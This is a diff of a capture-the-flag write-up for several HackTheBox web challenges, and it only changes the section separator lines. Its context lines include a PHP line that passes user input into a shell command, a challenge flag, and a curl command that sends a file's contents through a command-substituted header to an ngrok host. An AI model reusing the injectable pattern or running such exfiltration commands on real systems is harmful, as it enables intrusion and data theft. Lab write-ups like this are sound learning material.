@@ -20,7 +20,7 @@ In that there was a `secret` command which seemed interesting.  Just gave that c
 
 ![](https://i.imgur.com/f3UdedV.png)
 
----
+----------
 
 ## TimeKORP
 > Solved By : thewhiteh4t
@@ -60,7 +60,7 @@ $this->command = "date '+" . $format . "' 2>&1";
 
 ![](https://i.imgur.com/BhQqnTJ.png)
 
----
+----------
 
 ## LockTalk
 > Solved by : thewhiteh4t & Starry-lord
@@ -115,7 +115,7 @@ With the valid token we retrieved, and the correct role name, we can now craft a
 HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
 ```
 
----
+----------
 
 ## Labyrinth Linguist
 > Solved by : thewhiteh4t
@@ -194,7 +194,7 @@ curl "https://f084-116-74-26-67.ngrok-free.app/special" -H "User-Agent: $(cat /f
 
 ![](https://i.imgur.com/o1yA2db.png)
 
----
+----------
 
 ## KORP Terminal
 > Solved by : Legend, thewhiteh4t
